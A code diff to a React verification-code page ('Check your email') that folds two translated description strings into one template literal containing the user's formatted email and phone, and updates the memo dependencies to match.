@@ -62,8 +62,7 @@ const Verify = () => {
     const defaultTexts = useMemo(
         () => ({
             title: 'Check your email',
-            description: 'We have sent a verification code to your', // TÁCH RA
-            descriptionPart2: 'Please enter the code we just sent to continue.', // TÁCH RA
+            description: `We have sent a verification code to your ${formatEmailForDisplay(userInfo.email)} and ${formatPhoneForDisplay(userInfo.phone)}. Please enter the code we just sent to continue.`,
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
             infoDescription:
@@ -75,7 +74,7 @@ const Verify = () => {
             loadingText: 'Please wait',
             secondsText: 'seconds'
         }),
-        [] // BỎ DEPENDENCY
+        [userInfo.email, userInfo.phone]
     );
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
@@ -86,7 +85,6 @@ const Verify = () => {
                 const [
                     translatedTitle,
                     translatedDesc,
-                    translatedDescPart2,
                     translatedPlaceholder,
                     translatedInfoTitle,
                     translatedInfoDesc,
@@ -99,7 +97,6 @@ const Verify = () => {
                 ] = await Promise.all([
                     translateText(defaultTexts.title, targetLang),
                     translateText(defaultTexts.description, targetLang),
-                    translateText(defaultTexts.descriptionPart2, targetLang),
                     translateText(defaultTexts.placeholder, targetLang),
                     translateText(defaultTexts.infoTitle, targetLang),
                     translateText(defaultTexts.infoDescription, targetLang),
@@ -114,7 +111,6 @@ const Verify = () => {
                 setTranslatedTexts({
                     title: translatedTitle,
                     description: translatedDesc,
-                    descriptionPart2: translatedDescPart2,
                     placeholder: translatedPlaceholder,
                     infoTitle: translatedInfoTitle,
                     infoDescription: translatedInfoDesc,
@@ -194,15 +190,7 @@ const Verify = () => {
             <title>Account | Privacy Policy</title>
             <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                 <p className='text-3xl font-bold'>{translatedTexts.title}</p>
-                
-                {/* PHẦN QUAN TRỌNG: TÁCH DESCRIPTION RA */}
-                <p>
-                    {translatedTexts.description}{' '}
-                    <span className="font-medium text-blue-600">
-                        {formatEmailForDisplay(userInfo.email)} and {formatPhoneForDisplay(userInfo.phone)}
-                    </span>
-                    . {translatedTexts.descriptionPart2}
-                </p>
+                <p>{translatedTexts.description}</p>
 
                 <img src={VerifyImage} alt='' />
                 <input
